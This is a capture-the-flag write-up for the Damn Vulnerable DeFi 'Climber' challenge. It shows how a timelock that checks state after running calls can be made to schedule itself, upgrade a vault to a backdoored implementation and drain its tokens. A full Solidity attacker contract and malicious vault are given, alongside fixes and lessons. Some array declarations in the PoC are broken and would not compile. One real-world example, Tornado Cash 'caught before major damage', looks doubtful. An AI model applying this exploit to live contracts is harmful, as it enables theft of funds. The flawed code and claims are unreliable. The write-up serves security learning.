# Climber — Audit Report

**Protocol:** Damn Vulnerable DeFi<br>
**Challenge:** Climber<br>
**Time Spent:** ~2 hours<br>
**Status:** Solved<br>

---

## Executive Summary

**Vulnerability Found:** Check-after-effect vulnerability in timelock execution allows operations to schedule themselves mid-execution

**Severity:** Critical

**Attack Complexity:** Medium

**Impact:** Complete loss of 10 million DVT tokens from vault through unauthorized upgrade and sweep

**Root Cause:** The `execute()` function validates operation state AFTER executing external calls, allowing attackers to manipulate contract state during execution to pass subsequent checks

---

## Challenge Overview

**Objective:** Rescue all 10 million DVT tokens from the vault and deposit them into the designated recovery account

**Initial State:**

* Vault balance: 10,000,000 DVT tokens
* Attacker balance: 0.1 ETH
* Relevant contracts:

  * `ClimberVault` (UUPS upgradeable proxy) - holds tokens
  * `ClimberTimelock` - owner of vault, controls upgrades
  * Timelock has ADMIN_ROLE (can grant PROPOSER_ROLE)
  * Only PROPOSER_ROLE can schedule operations
  * Operations require 1 hour delay before execution

**Success Criteria:**

* [x] Drain all 10,000,000 DVT tokens from vault
* [x] Transfer tokens to recovery address
* [x] Vault balance is 0

---

## Vulnerability Analysis

### Economic Incentive Analysis

**Attack Priority:**

1. **Timelock Execution Exploit** — Potential profit: 10,000,000 DVT, Cost: Gas only

   * Likelihood: High (execute() is callable by anyone)
   * Impact: Critical (complete vault drain)

2. **Sweeper Role Exploitation** — Notes: Sweeper address set in initializer and cannot be modified normally (disabled initializers)

### Technical Analysis

**Vulnerable Component:** `ClimberTimelock.execute()` function

**Location:**

* `ClimberTimelock.sol`
* UUPS upgrade mechanism in `ClimberVault.sol`

**Vulnerability Type:** Check-After-Effect / State Manipulation via External Calls

**Code Review:**

```solidity
function execute(
    address[] calldata targets, 
    uint256[] calldata values, 
    bytes[] calldata dataElements, 
    bytes32 salt
) external payable {
    // ... validation checks ...
    
    bytes32 id = getOperationId(targets, values, dataElements, salt);

    for (uint8 i = 0; i < targets.length; ++i) {
        targets[i].functionCallWithValue(dataElements[i], values[i]); // ← Execute FIRST
    }

    if (getOperationState(id) != OperationState.ReadyForExecution) { // ← Check AFTER
        revert NotReadyForExecution(id);
    }

    operations[id].executed = true;
}
```

**Why This Is Exploitable:**

* The function executes external calls BEFORE validating that the operation was properly scheduled
* This violates the checks-effects-interactions pattern
* An attacker can craft operations that modify the timelock's state during execution
* Since Ethereum is deterministic, the operation ID can be calculated off-chain
* The attacker can make the timelock grant them PROPOSER_ROLE, reduce delay to 0, and schedule the operation—all during the same execution
* The final check passes because the operation is now scheduled with zero delay

**Notes on roles and constructor configuration (clarification):**

* `PROPOSER_ROLE` and `ADMIN_ROLE` are `bytes32` role identifiers (e.g. `bytes32 public constant PROPOSER_ROLE = keccak256("PROPOSER_ROLE")`).
* In the timelock constructor the contract grants `ADMIN_ROLE` to the designated admin address and to `address(this)` (the timelock contract itself), e.g. `_grantRole(ADMIN_ROLE, admin); _grantRole(ADMIN_ROLE, address(this));`. Because the timelock is an admin, it can grant the `PROPOSER_ROLE` during execution (and the grant takes immediate effect within the same transaction).

**Attack Prerequisites:**

* [x] Understanding of UUPS upgrade pattern
* [x] Knowledge that timelock has ADMIN_ROLE (can grant PROPOSER_ROLE)
* [x] Ability to calculate operation ID deterministically
* [x] Understanding that `grantRole` takes effect immediately in the same transaction

**Note on operation ID determinism and salt usage:**
The operation identifier is computed deterministically via `getOperationId(targets, values, dataElements, salt)`. The attacker must reuse the exact same `targets`, `values`, `dataElements`, and `salt` when calling `schedule(...)` inside the callback so the operation ID matches. In the PoC below the attacker uses `salt = keccak256("CLIMBER_EXPLOIT")` for both `execute()` and `schedule()`.

---

## Attack Vector

### Step-by-Step Exploit

**Phase 1: Preparation**

1. Deploy a malicious vault implementation that removes access control from token sweep functionality
2. Calculate the operation ID off-chain using the deterministic `getOperationId()` function (e.g. use `salt = keccak256("CLIMBER_EXPLOIT")`)
3. Prepare 4 operations to be executed by the timelock

**Phase 2: Exploit Execution via execute()**

3. **Operation 1:** Call `timelock.updateDelay(0)` - Timelock modifies itself to remove the 1-hour delay
4. **Operation 2:** Call `timelock.grantRole(PROPOSER_ROLE, attacker)` - Timelock grants attacker the proposer role (timelock is an ADMIN)
5. **Operation 3:** Call `vault.upgradeToAndCall(maliciousImpl, "")` - Timelock (as vault owner) upgrades the vault to malicious implementation

   * Note: `upgradeToAndCall(newImpl, data)` both sets the implementation and immediately executes `data` as a call from the proxy; this lets the attacker perform setup/drain atomically if desired.
6. **Operation 4:** Call back to attacker contract's `scheduleOperation()` function - This function then calls `timelock.schedule()` with the same parameters (same targets, values, dataElements, and the same salt)

**(Clarification on ordering)**
The PoC implements `updateDelay` → `grantRole` → `upgradeToAndCall` → `schedule`. This ordering works because role grants and delay updates take effect immediately in the same transaction, and the `schedule()` call in Operation 4 uses the identical deterministic `salt` parameters so the `getOperationState(id)` check performed after the loop will return `ReadyForExecution`.

**Phase 3: State Validation**

7. After all operations execute, the check `getOperationState(id) != OperationState.ReadyForExecution` is performed
8. The check PASSES because Operation 4 just scheduled the operation with 0 delay
9. The operation is marked as executed: `operations[id].executed = true`

**Phase 4: Token Sweep**

10. Call the backdoor function on the upgraded malicious vault
11. Transfer all 10 million DVT tokens to the recovery address

---

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {ClimberTimelock, PROPOSER_ROLE} from "./ClimberTimelock.sol";
import {ClimberVault} from "./ClimberVault.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract ClimberAttacker {
    ClimberTimelock public immutable timelock;
    ClimberVault public immutable vault;
    IERC20 public immutable token;
    address public immutable recovery;
    
    address[] private targets;
    uint256[] private values;
    bytes[] private dataElements;
    bytes32 private salt;
    
    constructor(
        address _timelock,
        address _vault,
        address _token,
        address _recovery
    ) {
        timelock = ClimberTimelock(payable(_timelock));
        vault = ClimberVault(_vault);
        token = IERC20(_token);
        recovery = _recovery;
    }
    
    function attack() external {
        MaliciousVault maliciousImpl = new MaliciousVault();
        
        targets = new address;
        values = new uint256;
        dataElements = new bytes;
        salt = keccak256("CLIMBER_EXPLOIT");
        
        // Operation 1: Update delay to 0
        targets[0] = address(timelock);
        values[0] = 0;
        dataElements[0] = abi.encodeCall(timelock.updateDelay, (0));
        
        // Operation 2: Grant PROPOSER_ROLE to this contract
        targets[1] = address(timelock);
        values[1] = 0;
        dataElements[1] = abi.encodeCall(
            timelock.grantRole,
            (PROPOSER_ROLE, address(this))
        );
        
        // Operation 3: Upgrade vault (timelock is owner)
        targets[2] = address(vault);
        values[2] = 0;
        dataElements[2] = abi.encodeCall(
            vault.upgradeToAndCall,
            (address(maliciousImpl), "")
        );
        
        // Operation 4: Callback to schedule the operation
        targets[3] = address(this);
        values[3] = 0;
        dataElements[3] = abi.encodeCall(this.scheduleOperation, ());
        
        // Execute the exploit
        timelock.execute(targets, values, dataElements, salt);
        
        // Sweep all tokens
        MaliciousVault(address(vault)).sweepFunds(address(token), recovery);
    }
    
    // Called by timelock during execute() - we now have PROPOSER_ROLE
    function scheduleOperation() external {
        timelock.schedule(targets, values, dataElements, salt);
    }
}

contract MaliciousVault is ClimberVault {
    constructor() {
        _disableInitializers();
    }
    
    // Backdoor - no access control
    function sweepFunds(address token, address recipient) external {
        IERC20(token).transfer(recipient, IERC20(token).balanceOf(address(this)));
    }
}
```

**Test assertions:**

* `assertEq(token.balanceOf(address(vault)), 0)`
* `assertEq(token.balanceOf(recovery), 10_000_000e18)`

---

## Recommendations

### Immediate Fixes

**1. Implement Checks-Effects-Interactions Pattern**

```solidity
// BEFORE (vulnerable)
function execute(...) external payable {
    bytes32 id = getOperationId(targets, values, dataElements, salt);
    
    for (uint8 i = 0; i < targets.length; ++i) {
        targets[i].functionCallWithValue(dataElements[i], values[i]);
    }
    
    if (getOperationState(id) != OperationState.ReadyForExecution) {
        revert NotReadyForExecution(id);
    }
    
    operations[id].executed = true;
}

// AFTER (fixed)
function execute(...) external payable {
    bytes32 id = getOperationId(targets, values, dataElements, salt);
    
    // CHECK state BEFORE execution
    if (getOperationState(id) != OperationState.ReadyForExecution) {
        revert NotReadyForExecution(id);
    }
    
    // EFFECT - mark as executed
    operations[id].executed = true;
    
    // INTERACTION - execute calls
    for (uint8 i = 0; i < targets.length; ++i) {
        targets[i].functionCallWithValue(dataElements[i], values[i]);
    }
}
```

**2. Add Reentrancy Protection**

```solidity
import {ReentrancyGuard} from "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract ClimberTimelock is ReentrancyGuard {
    function execute(...) external payable nonReentrant {
        // ... function body
    }
}
```

**3. Implement Operation State Locking**

* Prevent operations from being scheduled while they're being executed
* Add a `executing` mapping to track operations currently in execution
* Revert in `schedule()` if the operation ID is currently being executed

---

## Lessons Learned

### Pattern Identified

**Pattern Name:** `Check-After-Effect-Vulnerability`

**Description:** Performing state validation AFTER executing external calls allows attackers to manipulate contract state during execution to bypass security checks. This is a violation of the checks-effects-interactions pattern.

**Where This Appears:**

* Timelock and governance contracts with delayed execution
* Multi-step operations that modify contract state
* Any contract that validates state after external calls
* Contracts with self-referential operations

**How to Spot It:**

```markdown
Red flags:
- External calls (call, delegatecall, functionCall) executed before state validation
- State checks that occur after a loop of external calls
- Operations that can modify the contract's own access control during execution
- Contracts that are both ADMIN and executor of operations
- Deterministic operation IDs that can be calculated off-chain
```

### Key Takeaways

1. **Always validate state BEFORE executing external calls** - The checks-effects-interactions pattern exists for a reason. Never check state after interactions.

2. **Be wary of self-referential operations** - When a contract can modify its own state through external calls (like the timelock granting itself roles), ensure proper ordering and protections.

3. **Understand the full call context** - The `msg.sender` in a callback is different from the original caller. This is critical for access control in complex execution flows.

4. **UUPS upgrades + compromised owner = total control** - Once an attacker can upgrade the implementation, they have complete control. The proxy pattern preserves storage but not logic.

5. **Deterministic functions are predictable** - When operation IDs or similar values are deterministically calculated from user inputs, attackers can pre-calculate them for exploitation.

### Real-World Examples

* **Nomad Bridge (2022)** — Improper initialization allowed attackers to bypass merkle proof verification, draining $190M
* **Tornado Cash Governance (2023)** — Proposal execution logic allowed malicious proposals to grant attacker control, though caught before major damage
* **Wormhole Bridge (2022)** — Signature verification bypass in guardian system led to $325M loss

---

## Metadata

**Tools Used:** Foundry, Manual review
**Pattern Library Entry:** `#check-after-effect`
**Time Breakdown:**

* 00:00-00:30 — Understanding UUPS pattern and protocol architecture
* 00:30-01:00 — Identifying the check-after-effect vulnerability in execute()
* 01:00-01:30 — Designing the exploit (self-scheduling mechanism)
* 01:30-02:00 — Implementation and testing

**Total Time:** ~2 hours

---

*Report generated on [07-11-2025] by [0xUnavailable]*  
*GitHub: [https://github.com/0xUnavailable]*  
*Twitter: [https://x.com/0xUnavailable]*


---
